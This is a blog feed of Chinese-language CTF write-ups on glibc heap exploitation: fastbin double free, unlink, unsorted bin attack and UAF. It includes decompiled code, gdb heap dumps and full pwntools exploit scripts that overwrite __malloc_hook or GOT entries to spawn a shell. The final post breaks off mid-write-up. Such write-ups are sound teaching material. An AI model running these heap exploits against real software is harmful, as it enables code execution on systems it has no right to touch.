<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://czh11.github.io</id>
    <title>Nono</title>
    <updated>2020-12-11T12:25:34.887Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://czh11.github.io"/>
    <link rel="self" href="https://czh11.github.io/atom.xml"/>
    <subtitle>明天会更好</subtitle>
    <logo>https://czh11.github.io/images/avatar.png</logo>
    <icon>https://czh11.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Nono</rights>
    <entry>
        <title type="html"><![CDATA[Fastbin Attack]]></title>
        <id>https://czh11.github.io/post/fastbin-attack/</id>
        <link href="https://czh11.github.io/post/fastbin-attack/">
        </link>
        <updated>2020-12-11T12:18:22.000Z</updated>
        <content type="html"><![CDATA[<p>fastbin attack</p>
<p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
<p>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞<br>
漏洞发生于 fastbin 类型的 chunk 中<br>
如果细分的话，可以做如下的分类：</p>
<p>Fastbin Double Free</p>
<p>Fastbin Double Free是指fastbin中的chunk可以被多次释放，因此可以在fastbin链表中存在多次，可导致多个指针指向同一个堆块</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<p>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>
fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p>
<pre><code>/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = &quot;double free or corruption (fasttop)&quot;;
        goto errout;
}
</code></pre>
<p>例如。申请chunk0，chunk1，然后释放chunk0，chunk1，此时链表中的main_arena-&gt;chunk1-&gt;chunk0，如果此时在释放chunk0，链表中的情况：main_arena-&gt;chunk0-&gt;chunk1-&gt;chunk0.</p>
<p>House of Spirit<br>
Alloc to Stack<br>
Arbitrary Alloc</p>
<p>例子：</p>
<p>查看代码</p>
<p>有四个功能，Allocate，Fill， Free，Dump</p>
<pre><code>unsigned __int64 __fastcall sub_E7F(__int64 a1, __int64 a2)
{
  unsigned __int64 result; // rax
  int v3; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  printf(&quot;Index: &quot;, a2);
  result = sub_138C(&quot;Index: &quot;, a2);
  v3 = result;
  if ( (result &amp; 0x80000000) == 0LL &amp;&amp; (signed int)result &lt;= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf(&quot;Size: &quot;);
      result = sub_138C(&quot;Size: &quot;, a2);
      v4 = result;
      if ( (signed int)result &gt; 0 )
      {
        printf(&quot;Content: &quot;);
        result = sub_11B2(*(_QWORD *)(24LL * v3 + a1 + 16), v4);
      }
    }
  }
  return result;
}
</code></pre>
<p>在fill功能中没有对size的大小作出限制，可以造成堆溢出，</p>
<p>查看下保护</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec babyheap
[*] '/home/giantbranch/Desktop/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  '/home/giantbranch/glibc-all-in-one-master/libs/2.23-0ubuntu3_amd64'

</code></pre>
<p>保护全开。</p>
<p>基本思路：</p>
<p>利用 unsorted bin 地址泄漏 libc 基地址。<br>
利用 fastbin attack 将chunk 分配到 malloc_hook 附近。</p>
<p>首先申请6个堆，chunk0，chunk1，chunk2，chunk3，chunk4，chunk5。chunk5</p>
<pre><code>add(0x10)#chunk0
add(0x10)#chunk1
add(0x10)#chunk2
add(0x10)#chunk3
add(0x80)#chunk4
add(0x80)#chunk5，防止chunk4被释放后合并到top chunk中
</code></pre>
<pre><code>gdb-peda$ heap
0x559d2111f000 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f020 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f040 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f060 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x91
}
0x559d2111f080 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x91, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x559d2111f110 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x91, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x559d2111f1a0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20e61, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>释放chunk2，chunk1</p>
<pre><code>0x20: 0x559d2111f020 —▸ 0x559d2111f040 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</code></pre>
<pre><code>0x559d2111f020 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x559d2111f040, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f040 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
</code></pre>
<p>这时修改chunk1的fd为chunk4的地址，使得chunk1-&gt;chunk4，同时在申请堆的时候会对size的大小进行检测，这里通过chunk3溢出修改chunk4的堆的大小为0x21</p>
<pre><code>free(2)#free chunk2
free(1)#free chunk1
payload='a'*0x10+p64(0)+p64(0x21)+p8(0x80)
fill(0,len(payload),payload)
payload='a'*0x10+p64(0)+p64(0x21)
fill(3,len(payload),payload)
add(0x10)#chunk1
add(0x10)#chunk2
</code></pre>
<pre><code>0x559d2111f000 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x6161616161616161, 
  bk = 0x6161616161616161, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f020 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x559d2111f080, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
</code></pre>
<pre><code>0x559d2111f080 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>这时chunk2也指向chunk4</p>
<p>然后再通过chunk3把chunk4的size大小修改回去，</p>
<pre><code>0x559d2111f080 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x91, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>同时释放chunk4，这时chunk4的fd和bk都指向main_arena+88</p>
<pre><code>0x559d2111f080 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x91, 
  fd = 0x7f7acadeeb78 &lt;main_arena+88&gt;, 
  bk = 0x7f7acadeeb78 &lt;main_arena+88&gt;, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>由于chunk2与chunk4指向同一个堆块，这时只要输出chunk2的内容就得到main_arena+88，这样就得到libcbase，这里由于got表不可写，通过修改malloc_hook来达到目的，</p>
<pre><code>gdb-peda$ x/4gx 0x7f7acadeeb20-0x33
0x7f7acadeeaed &lt;_IO_wide_data_0+301&gt;:	0x7acaded260000000	0x000000000000007f
0x7f7acadeeafd:	0x7acaab03f0000000	0x7acaaaffd000007f
gdb-peda$ x/4gx 0x7f7acadeeb20-0x10
0x7f7acadeeb10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000
0x7f7acadeeb20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>可以发现main_arena+88-0x33这个地方适合伪造fake_chunk</p>
<p>接下来申请一个0x61大小的chunk4，同时释放它，然后修改chunk4的fd为fake_chunk的地址，然后连续申请两个0x60大小的堆，这样就申请到了fake_chunk。</p>
<pre><code>add(0x60)
free(4)
fake_chunk=main_arena-0x33
payload='a'*0x10+p64(0)+p64(0x71)+p64(fake_chunk)
fill(3,len(payload),payload)
add(0x60)
add(0x60)
</code></pre>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x559d2111f080 —▸ 0x7f7acadeeaed (_IO_wide_data_0+301) ◂— 0x7acaab03f0000000
0x80: 0x0
</code></pre>
<p>之后就修改 malloc_hook 处的指针即可得到触发 onegadget。</p>
<pre><code>gdb-peda$ x/4gx 0x7f7acadeeb10
0x7f7acadeeb10 &lt;__malloc_hook&gt;:	0x00007f7acaa7025a	0x0000000000000000
0x7f7acadeeb20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>exp：</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
from LibcSearcher import *
context.log_level='debug'
r=process(&quot;./babyheap&quot;)
def add(size):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;1&quot;)
    r.recvuntil(&quot;Size: &quot;)
    r.sendline(str(size))
def fill(index,size,content):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;2&quot;)
    r.recvuntil(&quot;Index: &quot;)
    r.sendline(str(index))
    r.recvuntil(&quot;Size: &quot;)
    r.sendline(str(size))
    r.recvuntil(&quot;Content: &quot;)
    r.send(content)
def free(index):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;3&quot;)
    r.recvuntil(&quot;Index: &quot;)
    r.sendline(str(index))
def dump(index):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;4&quot;)
    r.recvuntil(&quot;Index: &quot;)
    r.sendline(str(index))
gdb.attach(r)
add(0x10)#chunk0
add(0x10)#chunk1
add(0x10)#chunk2
add(0x10)#chunk3
add(0x80)#chunk4
add(0x80)#chunk5
free(2)#free chunk2
free(1)#free chunk1
payload='a'*0x10+p64(0)+p64(0x21)+p8(0x80)#堆的始终是 4KB 对齐的，所以chunk4的起始地址的第一个字节必然是0x80
fill(0,len(payload),payload)
payload='a'*0x10+p64(0)+p64(0x21)
fill(3,len(payload),payload)
add(0x10)#chunk1
add(0x10)#chunk2
payload='a'*0x10+p64(0)+p64(0x91)
fill(3,len(payload),payload)
free(4)#free chunk4
dump(2)
r.recvuntil(&quot;Content: &quot;)
main_arena=u64(r.recv()[1:8].ljust(8,'\x00'))-88
main_arena_offset=0x3c3b20
libcbase=main_arena-main_arena_offset
onegadget=libcbase+0x4525a
print(hex(onegadget))
print(hex(main_arena))
add(0x60)#chunk4
free(4)
fake_chunk=main_arena-0x33
payload='a'*0x10+p64(0)+p64(0x71)+p64(fake_chunk)
fill(3,len(payload),payload)
add(0x60)#chunk4
add(0x60)#chunk6
payload='a'*0x13+p64(onegadget)
fill(6,len(payload),payload)
add(0x90)
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[unlink]]></title>
        <id>https://czh11.github.io/post/unlink/</id>
        <link href="https://czh11.github.io/post/unlink/">
        </link>
        <updated>2020-12-03T11:41:22.000Z</updated>
        <content type="html"><![CDATA[<p>unlink机制的利用</p>
<p>利用思路</p>
<p>1.UAF，可以修改free状态下smallbin或者unsorted bin的fd和bk指针</p>
<p>2.已知位置存在一个指针指向可进行的UAF的chunk</p>
<p>效果</p>
<p>使得已指向UAF chunk的指针ptr变为ptr-0x18</p>
<p>思路</p>
<p>1.设指向UAF chunk的指针的地址为ptr</p>
<p>2.修改fd为ptr-0x18</p>
<p>2.修改bk为ptr-0x10</p>
<p>3.触发unlink</p>
<p>ptr处的指针变为ptr-0x18</p>
<p>例子：ctfwiki-stkof</p>
<pre><code>signed __int64 sub_4009E8()
{
  signed __int64 result; // rax
  int i; // eax
  unsigned int v2; // [rsp+8h] [rbp-88h]
  __int64 n; // [rsp+10h] [rbp-80h]
  char *ptr; // [rsp+18h] [rbp-78h]
  char s; // [rsp+20h] [rbp-70h]
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fgets(&amp;s, 16, stdin);
  v2 = atol(&amp;s);
  if ( v2 &gt; 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !::s[v2] )
    return 0xFFFFFFFFLL;
  fgets(&amp;s, 16, stdin);
  n = atoll(&amp;s);
  ptr = ::s[v2];
  for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )
  {
    ptr += i;
    n -= i;
  }
  if ( n )
    result = 0xFFFFFFFFLL;
  else
    result = 0LL;
  return result;
}
</code></pre>
<p>存在堆溢出的情况</p>
<p>这题在申请一个堆的时候会申请两个缓冲区，所以先申请一个堆chunk1把缓冲区申请下来，然后申请两个unsorted bin，chunk2，chunk3.</p>
<pre><code>gdb-peda$ heap
0x1176000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x1011, 
  fd = 0xa3434310a31, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1177010 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11770b0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa0a33, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11774c0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1177560 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1177600 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20a01, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}

</code></pre>
<p>然后再chunk2的数据地方伪造fake chunk，fake chunk-&gt;fd=s+0x10-0x18,fake chunk-&gt;bk=s+0x10-0x10,</p>
<pre><code>gdb-peda$ heap
0x1176000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x1011, 
  fd = 0xa3036310a320a32, 
  bk = 0x0, 
  fd_nextsize = 0x91, 
  bk_nextsize = 0x602138
}
0x1177010 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11770b0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa4b4f, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11774c0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0xa1, 
  fd = 0x0, 
  bk = 0x91, 
  fd_nextsize = 0x602138, 
  bk_nextsize = 0x602140
}
0x1177560 {
  prev_size = 0x90, 
  size = 0xa0, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1177600 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20a01, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}

</code></pre>
<p>然后进行unlink，让s[2]=s-0x8,</p>
<pre><code>0x602140:	0x0000000000000000	0x0000000001177020
0x602150:	0x0000000000602138	0x0000000000000000
</code></pre>
<p>这时对chunk2修改就是修改s[2]所指的地方，这里可以修改s[1]为free_got的地址，s[2]为puts_got的地址，s[3]为atol_got的地址，</p>
<pre><code>gdb-peda$ x/4gx 0x0602140
0x602140:	0x0000000000000000	0x0000000000602018
0x602150:	0x0000000000602020	0x0000000000602080

</code></pre>
<p>这是修改chunk1就是修改s[1]所指向的地方，这里把free_got处存储的free的地址改为puts_addr,这样调用free函数实际上执行的是puts函数，这里当free(chunk2)时，实际上是打印出puts_got中存储的puts函数的地址，</p>
<pre><code>gdb-peda$ x/4gx 0x0602140
0x602140:	0x0000000000000000	0x0000000000602018
0x602150:	0x0000000000602020	0x0000000000602080
gdb-peda$ x/4gx 0x0000000000602018
0x602018 &lt;free@got.plt&gt;:	0x0000000000400760	0x00007f5e45fa86a0
0x602028 &lt;fread@got.plt&gt;:	0x00007f5e45fa71b0	0x0000000000400786
</code></pre>
<p>然后得到system与/bin/sh的地址，然后修改chunk3就是修改s[3]所指向的地方，这里把atoi_got处存储的地址改为system的地址。</p>
<pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  signed int v5; // [rsp+Ch] [rbp-74h]
  char nptr; // [rsp+10h] [rbp-70h]
  unsigned __int64 v7; // [rsp+78h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  alarm(0x78u);
  while ( fgets(&amp;nptr, 10, stdin) )
  {
    v3 = atoi(&amp;nptr);
</code></pre>
<p>这样在执行atoi函数时实际执行的system函数，然后发送/bin/sh的地址，拿到flag。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[unsorted bin Attack]]></title>
        <id>https://czh11.github.io/post/unsorted-bin-attack/</id>
        <link href="https://czh11.github.io/post/unsorted-bin-attack/">
        </link>
        <updated>2020-12-02T09:27:27.000Z</updated>
        <content type="html"><![CDATA[<p>unsorted bin Attack</p>
<pre><code>  /* remove from unsorted list */
 if (__glibc_unlikely (bck-&gt;fd != victim))
  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
 unsorted_chunks (av)-&gt;bk = bck;
 bck-&gt;fd = unsorted_chunks (av); 
 /*bck为向后的一个free chunk，fwd为向前的free chunk*/
</code></pre>
<p>假设一个p为unsorted bin</p>
<p>当我们将一个p取出的时候，会将bck的值赋给unsorted_chunks (av)，同时将unsorted_chunks (av)赋给bck-&gt;fd,如果将p-&gt;bk的值改掉，改为target-0x10，</p>
<p>victim=unsorted_chunks (av)-&gt;bk=p</p>
<p>bck=p-&gt;bk=target-0x10</p>
<p>unsorted_chunks (av)-&gt;bk = bck=target-0x10</p>
<p>bck-&gt;fd=target-0x10+0x10=target=unsorted_chunks (av);</p>
<p><strong>开始时</strong></p>
<p>unsorted bin 的fd与bk指向它本身</p>
<p><strong>执行free（p）</strong></p>
<p>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p>
<p><strong>修改p-&gt;bk</strong></p>
<p>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p>
<p>申请400大小的chunk</p>
<p>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去unsorted bin中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p>
<p>例子cifwiki-magicheap</p>
<pre><code>      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic &lt;= 0x1305 )
        {
          puts(&quot;So sad !&quot;);
        }
        else
        {
          puts(&quot;Congrt !&quot;);
          l33t();
        }
</code></pre>
<pre><code>int l33t()
{
  return system(&quot;cat ./flag&quot;);
}
</code></pre>
<p>当magic &gt;0x1305时，拿到flag</p>
<pre><code>unsigned __int64 edit_heap()
{
  size_t v0; // ST08_8
  int v2; // [rsp+4h] [rbp-1Ch]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf(&quot;Index :&quot;);
  read(0, &amp;buf, 4uLL);
  v2 = atoi(&amp;buf);
  if ( v2 &lt; 0 || v2 &gt; 9 )
  {
    puts(&quot;Out of bound!&quot;);
    _exit(0);
  }
  if ( heaparray[v2] )
  {
    printf(&quot;Size of Heap : &quot;, &amp;buf);
    read(0, &amp;buf, 8uLL);
    v0 = atoi(&amp;buf);
    printf(&quot;Content of heap : &quot;, &amp;buf);
    read_input(heaparray[v2], v0);
    puts(&quot;Done !&quot;);
  }
  else
  {
    puts(&quot;No such heap !&quot;);
  }
  return __readfsqword(0x28u) ^ v4;
}
</code></pre>
<p>堆溢出，没有对size的大小进行检测</p>
<p>先申请三个堆，chunk0，chunk1，chunk2，</p>
<pre><code>0x11df000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x61616161, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df110 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x62626262, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df220 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x211, 
  fd = 0x63636363, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df430 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20bd1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}

</code></pre>
<p>释放chunk1，</p>
<pre><code>0x11df000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x61616161, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df110 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x7fb1a0a80b78 &lt;main_arena+88&gt;, 
  bk = 0x7fb1a0a80b78 &lt;main_arena+88&gt;, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df220 {
  prev_size = 0x110, 
  size = 0x210, 
  fd = 0x63636363, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df430 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20bd1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>通过修改chunk0来进行堆溢出来修改chunk1-&gt;bk为magic-0x10，</p>
<pre><code>0x11df000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df110 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x6020b0 &lt;stdin@@GLIBC_2.2.5&gt;, 
  fd_nextsize = 0xa, 
  bk_nextsize = 0x0
}
0x11df220 {
  prev_size = 0x110, 
  size = 0x210, 
  fd = 0x63636363, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x11df430 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20bd1, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x11df110 ◂— 0x0
BK: 0x11df110 —▸ 0x6020b0 (stdin@@GLIBC_2.2.5) ◂— 0x0
smallbins
empty
largebins
empty

</code></pre>
<p>然后申请被释放的堆，这样就修改了magic的值</p>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x11df110 ◂— 0x62626262 /* 'bbbb' */
BK: 0x6020b0 (stdin@@GLIBC_2.2.5) ◂— 0x0
smallbins
empty
largebins
empty
gdb-peda$ x/4gx 0x06020C0
0x6020c0 &lt;magic&gt;:	0x00007fb1a0a80b78	0x0000000000000000

</code></pre>
<p>exp：</p>
<pre><code>#!/usr/bin/env python2
#-*-coding: utf-8 -*
from pwn import *
context.log_level='debug'
r=process(&quot;./magicheap&quot;)
#r=remote(&quot;220.249.52.133&quot;,33940)
def add(size,content):
    r.recvuntil(&quot;Your choice :&quot;)
    r.sendline(&quot;1&quot;)
    r.recvuntil(&quot;Size of Heap : &quot;)
    r.sendline(str(size))
    r.recvuntil(&quot;Content of heap:&quot;)
    r.send(content)
def edit(index,size,content):
    r.recvuntil(&quot;Your choice :&quot;)
    r.sendline(&quot;2&quot;)
    r.recvuntil(&quot;Index :&quot;)
    r.sendline(str(index))
    r.recvuntil(&quot;Size of Heap : &quot;)
    r.sendline(str(size))
    r.recvuntil(&quot;Content of heap : &quot;)
    r.sendline(content)
def delete(index):
    r.recvuntil(&quot;Your choice :&quot;)
    r.sendline(&quot;3&quot;)
    r.recvuntil(&quot;Index :&quot;)
    r.sendline(str(index))
gdb.attach(r)
add(0x100,'aaaa')
add(0x100,'bbbb')
add(0x200,'cccc')
delete(1)
payload=p64(0)*32+p64(0)+p64(0x111)+p64(0)+p64(0x06020C0-0x10)
edit(0,0x200,payload)
add(0x100,'bbbb')
r.recvuntil(&quot;Your choice :&quot;)
r.sendline('4869')
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[unlink加UAF堆溢出]]></title>
        <id>https://czh11.github.io/post/unlink-jia-dui-yi-chu/</id>
        <link href="https://czh11.github.io/post/unlink-jia-dui-yi-chu/">
        </link>
        <updated>2020-12-01T12:36:37.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界- Noleak<br>
假设地址ptr指向的P<br>
对于64位的：<br>
FD-&gt;ptr-0x8<em>3<br>
BK-&gt;prt-0x8</em>2<br>
FD-&gt;bk=FD+0x18=ptr-0x18+0x18=ptr<br>
BK-&gt;fd=BK+0x10=ptr-0x10+0x10=ptr<br>
FD-&gt;bk=BK<br>
BK-&gt;fd=PD(p=ptr-0x18)<br>
最终的结果为p=ptr-0x18<br>
对于32位的：<br>
FD-&gt;ptr-0x4<em>3<br>
BK-&gt;prt-0x4</em>2<br>
FD-&gt;bk=FD+0xc=ptr-0xc+0xc=ptr<br>
BK-&gt;fd=BK+0x8=ptr-0x8+0x8=ptr<br>
FD-&gt;bk=BK<br>
BK-&gt;fd=PD(p=ptr-0xc)<br>
最终的结果为p=ptr-0xc<br>
查看一下保护</p>
<p>开了FULL RELRO，不能修改got表</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec timu
[*] '/home/giantbranch/Desktop/timu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre>
<p>看一下代码</p>
<pre><code>int sub_400917()
{
  void *v0; // rax
  unsigned int nbytes; // ST0C_4
  int v3; // [rsp+8h] [rbp-8h]

  sub_40072C(&quot;Index: &quot;, 7u);
  LODWORD(v0) = sub_4007B8();
  v3 = (signed int)v0;
  if ( (unsigned int)v0 &lt;= 9 )
  {
    v0 = buf[(unsigned int)v0];
    if ( v0 )
    {
      sub_40072C(&quot;Size: &quot;, 6u);
      nbytes = sub_4007B8();
      sub_40072C(&quot;Data: &quot;, 6u);
      LODWORD(v0) = read(0, buf[v3], nbytes);
    }
  }
  return (signed int)v0;
}
</code></pre>
<p>发现在修改内容的时候没有判断Size的大小，可以造成堆溢出，、</p>
<pre><code>void sub_4008D7()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  sub_40072C(&quot;Index: &quot;, 7u);
  v0 = sub_4007B8();
  if ( v0 &lt;= 9 )
    free(buf[v0]);
}
</code></pre>
<p>有个UAF</p>
<p>这题可以覆盖__malloc_hook为shellcode的地址，来拿到flag</p>
<p>先申请两个堆，堆的情况为</p>
<pre><code>0x1ea8000:	0x0000000000000000	0x00000000000000a1
0x1ea8010:	0x0000000000000a61	0x0000000000000000
gdb-peda$ 
0x1ea8020:	0x0000000000000000	0x0000000000000000
0x1ea8030:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8040:	0x0000000000000000	0x0000000000000000
0x1ea8050:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8060:	0x0000000000000000	0x0000000000000000
0x1ea8070:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8080:	0x0000000000000000	0x0000000000000000
0x1ea8090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80a0:	0x0000000000000000	0x00000000000000a1
0x1ea80b0:	0x0000000000000a62	0x0000000000000000
gdb-peda$ 
0x1ea80c0:	0x0000000000000000	0x0000000000000000
0x1ea80d0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea80e0:	0x0000000000000000	0x0000000000000000
0x1ea80f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8100:	0x0000000000000000	0x0000000000000000
0x1ea8110:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8120:	0x0000000000000000	0x0000000000000000
0x1ea8130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x1ea8140:	0x0000000000000000	0x0000000000020ec1

</code></pre>
